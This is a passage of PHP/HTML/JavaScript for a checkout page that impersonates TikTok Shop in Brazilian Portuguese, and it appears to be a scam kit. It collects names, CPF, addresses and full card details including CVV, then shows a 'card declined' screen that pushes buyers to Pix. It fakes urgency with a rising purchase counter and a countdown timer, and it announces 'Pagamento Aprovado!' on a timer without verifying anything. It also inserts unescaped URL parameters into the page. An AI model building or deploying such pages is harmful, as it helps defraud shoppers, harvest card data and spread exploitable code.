    $itemsData = [[ 'title' => isset($_GET['produto']) ? htmlspecialchars($_GET['produto']) : 'Produto em Oferta', 'price' => isset($_GET['preco']) ? $_GET['preco'] : '100,00', 'image' => isset($_GET['imagem']) ? $_GET['imagem'] : 'https://placehold.co/200x200', 'qty' => isset($_GET['quantidade']) ? (int)$_GET['quantidade'] : 1, 'variant' => 'Padrão' ]];
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Finalizar Compra</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <script> tailwind.config = { theme: { fontFamily: { sans: ['Inter', 'sans-serif'] }, extend: { colors: { tiktok: '#fe2c55', tiktokDark: '#e0244a', bgGray: '#f2f4f6', borderGray: '#e5e7eb' } } } } </script>
    <style>
        body { background-color: #ffffff; -webkit-tap-highlight-color: transparent; font-family: 'Inter', sans-serif; padding-bottom: 140px; font-size: 13px; }
        .hidden-screen { display: none !important; }
        .loader { border: 3px solid #f3f3f3; border-radius: 50%; border-top: 3px solid #fe2c55; width: 20px; height: 20px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .rainbow-line { height: 3px; width: 100%; margin: 15px 0 5px 0; background: repeating-linear-gradient(90deg, #3fd1ff 0, #3fd1ff 10px, transparent 10px, transparent 14px, #ff3b6a 14px, #ff3b6a 24px, transparent 24px, transparent 28px); opacity: 1; }
        .custom-input { width: 100%; padding: 10px 12px; border: 1px solid #e2e8f0; border-radius: 8px; outline: none; transition: all 0.2s; font-size: 13px; background: #fff; color: #333; margin-bottom: 8px; height: 42px; }
        .custom-input::placeholder { color: #9ca3af; font-size: 13px; }
        .custom-input:focus { border-color: #fe2c55; box-shadow: 0 0 0 1px rgba(254, 44, 85, 0.1); }
        .mobile-card { background: white; border-radius: 12px; padding: 0; margin-bottom: 15px; border: none; }
        .timer-bar { background-color: #fe2c55; color: white; border-radius: 8px; padding: 8px; text-align: center; font-weight: 700; font-size: 13px; margin-bottom: 15px; box-shadow: 0 2px 8px rgba(254, 44, 85, 0.2); }
        .section-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px; cursor: pointer; }
        .section-title { font-weight: 700; font-size: 13px; color: #1f2937; display: flex; align-items: center; gap: 8px; }
        .order-summary-content { display: block; padding-top: 8px; border-top: 1px solid #f3f4f6; margin-top: 5px; }
        .payment-card { border: 1px solid #e5e7eb; border-radius: 10px; padding: 12px; display: flex; items-center; justify-content: space-between; margin-bottom: 8px; cursor: pointer; background: #fff; }
        .payment-card.selected { border-color: #fe2c55; background: #fff; box-shadow: 0 0 0 1px #fe2c55 inset; }
        .radio-circle { width: 18px; height: 18px; border: 2px solid #e5e7eb; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: #fff; }
        .selected .radio-circle { border-color: #fe2c55; }
        .selected .radio-circle div { width: 10px; height: 10px; background: #fe2c55; border-radius: 50%; }
        details { border-bottom: 1px solid #f0f0f0; padding: 12px 0; }
        summary { list-style: none; font-size: 13px; color: #374151; font-weight: 500; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
        details[open] summary { margin-bottom: 6px; font-weight: 600; color: #1f2937; }
        details p { font-size: 12px; color: #6b7280; line-height: 1.4; padding-right: 5px; }
        @keyframes fadeInScale { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
        .animate-pop { animation: fadeInScale 0.2s cubic-bezier(0.16, 1, 0.3, 1); }
        .checkmark-circle { width: 50px; height: 50px; border-radius: 50%; display: block; stroke-width: 2; stroke: #fff; stroke-miterlimit: 10; margin: 10% auto; box-shadow: inset 0px 0px 0px #00c0a8; animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both; background: #00c0a8; display:flex; align-items:center; justify-content:center;}
        .checkmark-check { transform-origin: 50% 50%; stroke-dasharray: 48; stroke-dashoffset: 48; animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards; }
        @keyframes stroke { 100% { stroke-dashoffset: 0; } }
        @keyframes scale { 0%, 100% { transform: none; } 50% { transform: scale3d(1.1, 1.1, 1); } }
        @keyframes fill { 100% { box-shadow: inset 0px 0px 0px 30px #00c0a8; } }
    </style>
</head>
<body>
    <div class="text-center py-3 bg-white sticky top-0 z-40 shadow-sm"><div class="flex items-center justify-center gap-1"><img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/2560px-TikTok_logo.svg.png" style="height: 20px;" class="inline-block"><span class="font-bold text-lg tracking-tight text-black" style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">Shop</span></div></div>
    <div class="px-4 max-w-md mx-auto mt-3">
        <div class="timer-bar">Oferta termina em: <span id="top-timer" class="ml-1 font-bold">00 h : 14 m : 04 s</span></div>
        <div class="mobile-card">
            <div class="section-header" onclick="toggleSection('info')"><div class="section-title"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>Dados pessoais</div><svg id="arrow-info" class="transition-transform transform rotate-180 text-gray-400" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg></div>
            <div id="content-info" class="space-y-0"><input type="text" id="cust-name" class="custom-input" placeholder="Ex.: Maria da Silva"><input type="email" id="cust-email" class="custom-input" placeholder="Ex.: maria@email.com"><div class="relative"><div class="absolute inset-y-0 left-0 pl-3 top-0 flex items-center pointer-events-none h-[42px]"><img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Flag_of_Brazil.svg" class="w-4 h-3 rounded-sm"><span class="text-gray-500 text-xs ml-1 font-medium">+55</span></div><input type="tel" id="cust-phone" class="custom-input pl-[60px]" placeholder="(11) 96123-4567" oninput="maskPhone(this)"></div><input type="text" id="cust-cpf" class="custom-input" placeholder="CPF (Opcional)" oninput="maskCPF(this)"></div>
        </div>
        <div class="mobile-card">
            <div class="section-header" onclick="toggleSection('addr')"><div class="section-title">Endereço de entrega</div><svg id="arrow-addr" class="transition-transform transform rotate-180 text-gray-400" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg></div>
            <div id="content-addr" class="space-y-0"><input type="text" id="addr-zip" class="custom-input" placeholder="CEP *" onblur="fetchCep(this.value)"><div class="flex gap-2"><input type="text" id="addr-street" class="custom-input w-2/3" placeholder="Rua, Avenida *"><input type="text" id="addr-num" class="custom-input w-1/3" placeholder="123 *"></div><input type="text" id="addr-city" class="custom-input" placeholder="Cidade - UF"></div>
        </div>
        <div class="rainbow-line"></div>
        <div class="mobile-card mt-4">
            <div class="section-header" onclick="toggleSection('summary')" style="margin-bottom:0;"><div class="section-title text-[#fe2c55]"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"></path><line x1="3" y1="6" x2="21" y2="6"></line><path d="M16 10a4 4 0 0 1-8 0"></path></svg>Resumo do Pedido</div><div class="flex items-center gap-2"><span class="font-bold text-xs text-gray-900">R$ <span id="header-total">0,00</span></span><svg id="arrow-summary" class="transition-transform transform text-gray-400" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg></div></div>
            <div id="content-summary" class="order-summary-content hidden"><div id="product-list-container" class="space-y-3 pt-1"></div><div class="mt-3 pt-2 border-t border-gray-100"><div class="flex justify-between items-center text-xs text-gray-500 mb-1"><span>Produtos</span><span>R$ <span id="subtotal-val">0,00</span></span></div><div class="flex justify-between items-center text-sm text-gray-900 font-bold mt-2"><span>Total</span><span>R$ <span id="total-val-inner">0,00</span></span></div></div><div class="mt-3 flex items-center gap-1 text-[10px] text-green-600 font-medium"><svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>Compra 100% Segura e Criptografada</div></div>
        </div>
        <div id="payment-pix-v2" class="payment-card selected mb-2" onclick="selectPaymentV2('pix')">
            <div class="flex items-center gap-3"><div class="w-8 h-8 flex items-center justify-center"><img src="https://editor.sys-assets-check.com/img/pix.png" alt="Pix" class="w-full h-full object-contain"></div><div><div class="font-bold text-sm text-gray-900">Pix</div><div class="text-[11px] text-gray-500 leading-tight mt-0.5">Aprovacao imediata.</div></div></div><div class="radio-circle"><div></div></div>
        </div>
        <div id="payment-card-v2" class="payment-card mb-4" onclick="selectPaymentV2('card')">
            <div class="flex items-center gap-3"><div class="w-8 h-8 flex items-center justify-center text-gray-400"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg></div><div><div class="font-bold text-sm text-gray-900">Cartao de credito</div><div class="flex items-center gap-1.5 mt-1"><svg width="26" height="16" viewBox="0 0 36 24"><circle cx="12" cy="12" r="10" fill="#EB001B"/><circle cx="24" cy="12" r="10" fill="#F79E1B"/><path d="M18 4.5a9.9 9.9 0 0 0-3.5 7.5c0 3 1.3 5.7 3.5 7.5a9.9 9.9 0 0 0 3.5-7.5c0-3-1.3-5.7-3.5-7.5z" fill="#FF5F00"/></svg><svg width="40" height="14" viewBox="0 0 100 32"><path d="M38.3 0L24.8 32h-9.7L8.4 6.4c-.4-1.5-.7-2-1.9-2.6C4.2 2.8 1.5 1.9 0 1.4l.3-1.4h15.6c2 0 3.8 1.3 4.2 3.6l3.9 20.5L35 0h3.3zm12.2 0l-7.6 32h-9L41.4 0h9.1zm28.9 21.5c0-8.4-11.6-8.9-11.5-12.6 0-1.1 1.1-2.3 3.5-2.6 1.2-.2 4.4-.3 8.1 1.5l1.4-6.7C79.3.5 77.3 0 74.8 0c-8.7 0-14.9 4.6-14.9 11.3 0 4.9 4.4 7.7 7.8 9.3 3.5 1.7 4.6 2.8 4.6 4.3 0 2.3-2.8 3.4-5.3 3.4-4.5.1-7.1-1.2-9.2-2.2l-1.6 7.5c2.1 1 6 1.8 10 1.9 9.3 0 15.4-4.6 15.4-11.7zm23 10.5h8.1L103.6 0h-7.5c-1.7 0-3.1 1-3.7 2.5L81.7 32h9.3l1.8-5.1h11.4l1.1 5.1z" fill="#1A1F71"/></svg><svg width="30" height="12" viewBox="0 0 60 24"><rect width="60" height="24" rx="3" fill="#FFCB05"/><text x="30" y="17" font-size="14" font-weight="bold" text-anchor="middle" fill="#000">elo</text></svg><svg width="28" height="18" viewBox="0 0 40 26"><rect width="40" height="26" rx="3" fill="#016FD0"/><text x="20" y="18" font-size="9" font-weight="bold" text-anchor="middle" fill="#fff">AMEX</text></svg></div></div></div><svg class="text-gray-400" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>
        </div>
        <div class="text-center py-2 mb-2"><h3 class="font-bold text-gray-900 text-xs mb-1">Atenção</h3><div class="flex items-center justify-center gap-1"><svg class="text-[#fe2c55]" width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"></path></svg><span class="text-lg font-extrabold text-[#fe2c55]" id="sales-counter-display">758 Compras</span></div><p class="text-[11px] text-gray-500 mt-0 font-medium">Não perca essa oportunidade!</p></div>
        <div class="mb-6 mt-4">
            <h3 class="font-bold text-sm text-gray-900 mb-2">Perguntas Frequentes</h3>
            <details><summary>Pesquise antes de comprar <svg width="12" height="12" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" fill="none"><polyline points="6 9 12 15 18 9"></polyline></svg></summary><p>Verifique a reputação da loja e os comentários de outros compradores para garantir uma compra segura.</p></details>
            <details><summary>Conheça a garantia legal <svg width="12" height="12" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" fill="none"><polyline points="6 9 12 15 18 9"></polyline></svg></summary><p>O Código de Defesa do Consumidor garante 90 dias para defeitos aparentes em produtos duráveis.</p></details>
            <details><summary>Entenda as regras de troca <svg width="12" height="12" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" fill="none"><polyline points="6 9 12 15 18 9"></polyline></svg></summary><p>Em compras online, você tem o direito de se arrepender e devolver o produto em até 7 dias após o recebimento.</p></details>
            <details style="border-bottom: none;"><summary>Desconfie de ofertas boas demais <svg width="12" height="12" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" fill="none"><polyline points="6 9 12 15 18 9"></polyline></svg></summary><p>Compre somente aqui no site do tiktok shop.</p></details>
        </div>
    </div>
    <div class="fixed bottom-0 left-0 w-full bg-white border-t border-gray-200 p-3 pb-6 z-50 shadow-[0_-4px_10px_rgba(0,0,0,0.05)]"><div class="max-w-md mx-auto"><div class="flex justify-between items-end mb-2"><span class="text-xs text-gray-500 font-medium">Total (1 item):</span><span class="text-xl font-extrabold text-gray-900">R$ <span id="footer-total">0,00</span></span></div><button onclick="processPayment()" id="btn-pay" class="w-full bg-[#fe2c55] hover:bg-[#e0244a] text-white font-bold py-3.5 rounded-xl text-[15px] shadow-md transition-all active:scale-[0.98] flex items-center justify-center gap-2">Finalizar Compra</button></div></div>
    <div id="modal-tracking-warning" class="hidden-screen fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-pop"><div class="bg-white w-full max-w-[300px] rounded-2xl p-6 text-center shadow-xl relative"><div class="w-14 h-14 bg-[#fe2c55]/10 rounded-full flex items-center justify-center mx-auto mb-4"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fe2c55" stroke-width="2.5"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div><h3 class="text-[16px] font-bold text-gray-900 mb-2">Pedido em espera</h3><p class="text-[13px] text-gray-500 mb-6 leading-relaxed">Por favor finalize o pagamento para receber seu código de rastreio.</p><button onclick="closeTrackingModal()" class="w-full bg-white border border-gray-200 text-gray-900 font-bold py-3 rounded-xl text-[14px] shadow-sm active:scale-95 transition-transform hover:bg-gray-50">Fechar</button></div></div>
    <div id="screen-card-form-v2" class="hidden-screen fixed inset-0 z-[60] bg-white overflow-y-auto">
        <header class="bg-white px-4 py-4 flex items-center justify-between sticky top-0 z-10 border-b border-gray-100"><button onclick="closeCardScreenV2()" class="p-2 -ml-2"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg></button><h1 class="font-bold text-[17px] text-gray-900">Adicionar cartao</h1><div class="w-8"></div></header>
        <div class="px-4 py-6 max-w-md mx-auto">
            <div class="mb-6"><div class="flex justify-between items-center mb-2"><label class="text-[14px] font-medium text-gray-900">Numero do cartao</label><div class="flex gap-1.5 items-center"><svg width="26" height="16" viewBox="0 0 36 24"><circle cx="12" cy="12" r="10" fill="#EB001B"/><circle cx="24" cy="12" r="10" fill="#F79E1B"/><path d="M18 4.5a9.9 9.9 0 0 0-3.5 7.5c0 3 1.3 5.7 3.5 7.5a9.9 9.9 0 0 0 3.5-7.5c0-3-1.3-5.7-3.5-7.5z" fill="#FF5F00"/></svg><svg width="36" height="12" viewBox="0 0 100 32"><path d="M38.3 0L24.8 32h-9.7L8.4 6.4c-.4-1.5-.7-2-1.9-2.6C4.2 2.8 1.5 1.9 0 1.4l.3-1.4h15.6c2 0 3.8 1.3 4.2 3.6l3.9 20.5L35 0h3.3zm12.2 0l-7.6 32h-9L41.4 0h9.1zm28.9 21.5c0-8.4-11.6-8.9-11.5-12.6 0-1.1 1.1-2.3 3.5-2.6 1.2-.2 4.4-.3 8.1 1.5l1.4-6.7C79.3.5 77.3 0 74.8 0c-8.7 0-14.9 4.6-14.9 11.3 0 4.9 4.4 7.7 7.8 9.3 3.5 1.7 4.6 2.8 4.6 4.3 0 2.3-2.8 3.4-5.3 3.4-4.5.1-7.1-1.2-9.2-2.2l-1.6 7.5c2.1 1 6 1.8 10 1.9 9.3 0 15.4-4.6 15.4-11.7zm23 10.5h8.1L103.6 0h-7.5c-1.7 0-3.1 1-3.7 2.5L81.7 32h9.3l1.8-5.1h11.4l1.1 5.1z" fill="#1A1F71"/></svg><svg width="26" height="12" viewBox="0 0 60 24"><rect width="60" height="24" rx="3" fill="#FFCB05"/><text x="30" y="17" font-size="14" font-weight="bold" text-anchor="middle" fill="#000">elo</text></svg><svg width="24" height="16" viewBox="0 0 40 26"><rect width="40" height="26" rx="3" fill="#016FD0"/><text x="20" y="18" font-size="9" font-weight="bold" text-anchor="middle" fill="#fff">AMEX</text></svg></div></div><input type="text" id="card-number-v2" class="w-full p-4 border border-gray-200 rounded-lg text-[15px] outline-none focus:border-[#fe2c55] bg-gray-50" placeholder="Insira o numero do cartao" maxlength="19" oninput="maskCardNumberV2(this)"></div>
            <div class="flex gap-4 mb-6"><div class="flex-1"><label class="text-[14px] font-medium text-gray-900 block mb-2">Data de validade</label><input type="text" id="card-expiry-v2" class="w-full p-4 border border-gray-200 rounded-lg text-[15px] outline-none focus:border-[#fe2c55] bg-gray-50" placeholder="MM/AA" maxlength="5" oninput="maskExpiryV2(this)"></div><div class="flex-1"><label class="text-[14px] font-medium text-gray-900 block mb-2">CVV</label><input type="text" id="card-cvv-v2" class="w-full p-4 border border-gray-200 rounded-lg text-[15px] outline-none focus:border-[#fe2c55] bg-gray-50" placeholder="CVV" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'')"></div></div>
            <div class="mb-6"><label class="text-[14px] font-medium text-gray-900 block mb-2">Nome do titular</label><input type="text" id="card-holder-v2" class="w-full p-4 border border-gray-200 rounded-lg text-[15px] outline-none focus:border-[#fe2c55] bg-gray-50" placeholder="Nome completo" oninput="this.value=this.value.toUpperCase()"></div>
            <div class="flex items-center gap-2 mb-8"><div class="w-5 h-5 rounded border-2 border-[#fe2c55] bg-[#fe2c55] flex items-center justify-center"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div><span class="text-[13px] text-gray-900">Salvar este cartao para compras futuras</span></div>
        </div>
        <div class="fixed bottom-0 left-0 w-full bg-white border-t border-gray-200 p-4 pb-8 z-50"><div class="max-w-md mx-auto"><button onclick="processCardPaymentV2()" id="btn-card-continue-v2" class="w-full bg-gray-200 text-gray-400 font-bold py-4 rounded-xl text-[16px] transition-all" disabled>Continuar</button></div></div>
    </div>
    <div id="modal-card-declined-v2" class="hidden-screen fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-pop">
        <div class="bg-white w-full max-w-[340px] rounded-2xl p-6 text-center shadow-xl">
            <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M15 9l-6 6"/><path d="M9 9l6 6"/></svg></div>
            <h3 class="text-[18px] font-bold text-gray-900 mb-2">Pagamento Recusado</h3>
            <p class="text-[14px] text-gray-500 mb-4 leading-relaxed">Seu cartao foi recusado. Aproveite nosso desconto especial no PIX!</p>
            <div class="bg-green-50 border border-green-200 rounded-xl p-4 mb-4">
                <p class="text-[12px] text-green-600 font-medium mb-1">OFERTA EXCLUSIVA</p>
                <p class="text-[22px] font-bold text-green-600 mb-1"><span id="discount-percent-v2">{{CARD_DISCOUNT}}</span>% OFF no Pix</p>
                <p class="text-[14px] text-gray-600">Novo valor: <span class="font-bold text-green-600">R$ <span id="discounted-total-v2">0,00</span></span></p>
                <p class="text-[12px] text-gray-400 line-through">De R$ <span id="original-total-modal-v2">0,00</span></p>
            </div>
            <button onclick="acceptDiscountPixV2()" class="w-full bg-[#fe2c55] text-white font-bold py-3.5 rounded-xl text-[16px] shadow-sm active:scale-95 transition-transform mb-2">Pagar com Pix e Desconto</button>
            <button onclick="closeDeclinedModalV2()" class="w-full text-gray-500 text-[14px] py-2">Tentar outro cartao</button>
        </div>
    </div>
    <div id="screen-pix" class="hidden-screen fixed inset-0 z-[60] bg-[#f7f7f7] overflow-y-auto">
         <div class="bg-gradient-to-b from-[#e0f7fa] to-[#f7f7f7] pb-6"><header class="flex items-center px-4 py-4"><button onclick="window.location.reload()" class="p-1"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg></button><h1 class="flex-1 text-center font-bold text-lg pr-6">Código do pagamento</h1></header><div class="px-6 mt-2 flex justify-between items-start"><div><p class="font-bold text-[18px]">Aguardando o pagamento</p><p class="font-bold text-[26px] mt-1 text-gray-900">R$ <span id="pix-value">0,00</span></p><div class="flex items-center gap-2 mt-2 text-sm text-gray-600"><span>Vence em</span><span id="pix-countdown" class="bg-[#fe2c55] text-white font-bold px-2 py-0.5 rounded text-xs flex items-center gap-1">23:59:00</span></div></div><div class="bg-orange-400 rounded-full p-2 shadow-md text-white"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div></div></div>
        <div class="mx-4 -mt-4 bg-white rounded-xl shadow-sm p-5 border border-gray-100"><div class="flex items-center gap-2 mb-4"><div class="w-6 h-6 bg-teal-500 rounded-full flex items-center justify-center text-white"><svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L2 7v10c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-10-5z"/></svg></div><span class="font-bold text-lg">Pix</span></div><div class="bg-gray-50 rounded-lg p-3 mb-4 overflow-hidden flex flex-col items-center"><img id="pix-qr-img" style="width:180px; height:180px; display:none;" class="mb-2 mix-blend-multiply"><textarea id="pix-code-raw" class="w-full text-xs bg-transparent border-none text-center h-20 resize-none outline-none" readonly></textarea></div><button onclick="copyPixCode()" id="btn-copy" class="w-full bg-[#fe2c55] text-white font-bold py-3 rounded-lg flex items-center justify-center gap-2">Copiar código Pix</button></div>
        <div class="px-6 mt-6"><button onclick="showTrackingModal()" class="w-full bg-white border border-gray-300 text-gray-900 font-bold py-3 rounded-lg text-sm">Ver pedido</button></div>
    </div>
    <div id="modal-upsell-redirect" class="hidden-screen fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 animate-pop"><div class="bg-white w-full max-w-[320px] rounded-2xl p-6 text-center shadow-xl relative"><div id="upsell-status-icon"><div class="loader mx-auto" style="width:40px; height:40px; border-width:4px;"></div></div><h3 id="upsell-status-title" class="text-[18px] font-bold text-textDark mb-2 mt-4">Verificando pagamento...</h3><p id="upsell-status-desc" class="text-[14px] text-gray-500 mb-6 leading-relaxed">Aguarde enquanto confirmamos sua transação no banco.</p></div></div>
    <script>
        const upsellUrl = "{{UPSELL_URL}}";
        const upsellDelay = parseInt("{{UPSELL_DELAY}}") || 15;
        let isRedirectScheduled = false;
        const initialItems = <?php echo json_encode($itemsData); ?>;
        
        let cartItems = initialItems.map(item => { 
            let pStr = String(item.price);
            let p = 0;
            if (pStr.includes(',') && pStr.includes('.')) p = parseFloat(pStr.replace('R$', '').replace(/\./g, '').replace(',', '.'));
            else if (pStr.includes(',')) p = parseFloat(pStr.replace('R$', '').replace(',', '.'));
            else p = parseFloat(pStr.replace('R$', ''));
            if(isNaN(p)) p = 0;
            return { ...item, priceVal: p, qty: parseInt(item.qty) || 1 }; 
        });
        
        let currentTotalGlobal = 0;
        function toggleSection(id) { const content = document.getElementById('content-' + id); const arrow = document.getElementById('arrow-' + id); if (content.style.display === 'block') { content.style.display = 'none'; if(arrow) arrow.style.transform = 'rotate(0deg)'; } else { content.style.display = 'block'; if(arrow) arrow.style.transform = 'rotate(180deg)'; } }
        function renderCart() { const container = document.getElementById('product-list-container'); container.innerHTML = ''; cartItems.forEach((item, idx) => { container.innerHTML += \`<div class="flex gap-3 mb-2 items-start"><div class="w-12 h-12 bg-gray-100 rounded-md overflow-hidden flex-shrink-0 relative border border-gray-200"><img src="\${item.image}" class="w-full h-full object-cover"></div><div class="flex-1 min-w-0"><h4 class="text-xs font-medium text-gray-900 leading-tight line-clamp-1">\${item.title}</h4><div class="flex justify-between items-center mt-1"><span class="text-[#fe2c55] font-bold text-sm">R$ \${item.priceVal.toLocaleString('pt-BR', {minimumFractionDigits: 2})}</span><span class="text-xs text-gray-500">x\${item.qty}</span></div></div></div>\`; }); renderTotal(); }
        function renderTotal() { let total = cartItems.reduce((acc, item) => acc + (item.priceVal * item.qty), 0); currentTotalGlobal = total; document.getElementById('footer-total').innerText = total.toLocaleString('pt-BR', {minimumFractionDigits: 2}); document.getElementById('header-total').innerText = total.toLocaleString('pt-BR', {minimumFractionDigits: 2}); document.getElementById('subtotal-val').innerText = total.toLocaleString('pt-BR', {minimumFractionDigits: 2}); document.getElementById('total-val-inner').innerText = total.toLocaleString('pt-BR', {minimumFractionDigits: 2}); }
        let salesCount = 758; const salesEl = document.getElementById('sales-counter-display'); setInterval(() => { const increase = Math.floor(Math.random() * 2); if(increase > 0) { salesCount += increase; salesEl.innerText = salesCount + ' Compras'; salesEl.classList.add('scale-110', 'transition-transform', 'duration-200'); setTimeout(() => salesEl.classList.remove('scale-110'), 200); } }, 3000);
        
        async function processPayment() {
            const btn = document.getElementById('btn-pay'); const originalText = btn.innerHTML; const name = document.getElementById('cust-name').value; const cpf = document.getElementById('cust-cpf').value; const zip = document.getElementById('addr-zip').value; const num = document.getElementById('addr-num').value;
            if(!name || !zip || !num) { alert('Por favor, preencha os campos de Nome e Endereço.'); const infoContent = document.getElementById('content-info'); if(infoContent.style.display !== 'block') toggleSection('info'); const addrContent = document.getElementById('content-addr'); if(addrContent.style.display !== 'block') toggleSection('addr'); return; }
            let finalCpf = cpf; if(!finalCpf || finalCpf.length < 11) { finalCpf = '00000000000'; }
            btn.innerHTML = '<div class="loader mx-auto"></div>'; btn.disabled = true;
            
            // --- CORREÇ����O DO CLICK_ID AQUI ---
            const urlParams = new URLSearchParams(window.location.search);
            const clickId = urlParams.get('click_id') || urlParams.get('src') || '';

            const payload = { 
                amount: currentTotalGlobal, 
                cpf: finalCpf.replace(/\\D/g,''), 
                click_id: clickId,
                customer: { name: name, email: document.getElementById('cust-email').value || 'cliente@email.com', phone: (document.getElementById('cust-phone').value || '11999999999').replace(/\\D/g,'') }, 
                items: cartItems.map(i => ({ title: i.title, unit_price: i.priceVal || i.price, quantity: i.qty, tangible: false })) 
            };
            
            try { 
                const response = await fetch('processar_pagamento.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }); 
                const text = await response.text();
                let res;
                try { res = JSON.parse(text); } catch(e) { throw new Error("Resposta inválida do servidor: " + text.substring(0, 100)); }

                if(res.success) { 
                    document.getElementById('screen-pix').classList.remove('hidden-screen'); document.getElementById('pix-value').innerText = currentTotalGlobal.toLocaleString('pt-BR', {minimumFractionDigits: 2}); document.getElementById('pix-code-raw').value = res.pix_code; 
                    let qrSource = res.qr_image; 
                    if(!qrSource || qrSource === '') { qrSource = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(res.pix_code); } 
                    document.getElementById('pix-qr-img').src = qrSource; document.getElementById('pix-qr-img').style.display = 'block'; window.scrollTo(0,0); 
                } else { alert('Erro: ' + (res.message || 'Falha ao gerar PIX')); btn.innerHTML = originalText; btn.disabled = false; } 
            } catch(e) { console.error(e); alert('Erro de conexão: ' + e.message); btn.innerHTML = originalText; btn.disabled = false; }
        }
        function showTrackingModal() { document.getElementById('modal-tracking-warning').classList.remove('hidden-screen'); }
        function closeTrackingModal() { document.getElementById('modal-tracking-warning').classList.add('hidden-screen'); if(upsellUrl && upsellUrl.trim() !== "" && !isRedirectScheduled) { isRedirectScheduled = true; initiateRedirectSequence(); } else if (!upsellUrl) { location.reload(); } }
        function initiateRedirectSequence() { document.getElementById('modal-upsell-redirect').classList.remove('hidden-screen'); setTimeout(() => { document.getElementById('upsell-status-icon').innerHTML = '<div class="checkmark-circle"><div class="checkmark-check"></div></div>'; document.getElementById('upsell-status-title').innerText = 'Pagamento Aprovado!'; document.getElementById('upsell-status-title').classList.add('text-green-600'); document.getElementById('upsell-status-desc').innerText = 'Redirecionando para seu acesso...'; }, 2000); setTimeout(() => { window.location.href = upsellUrl; }, 3500); }
        let timeSeconds = 844; let pixSeconds = 86340; 
        setInterval(() => {
            if(timeSeconds > 0) timeSeconds--; const m = Math.floor((timeSeconds % 3600) / 60).toString().padStart(2,'0'); const s = (timeSeconds % 60).toString().padStart(2,'0'); document.getElementById('top-timer').innerText = \`00 h : \${m} m : \${s} s\`;
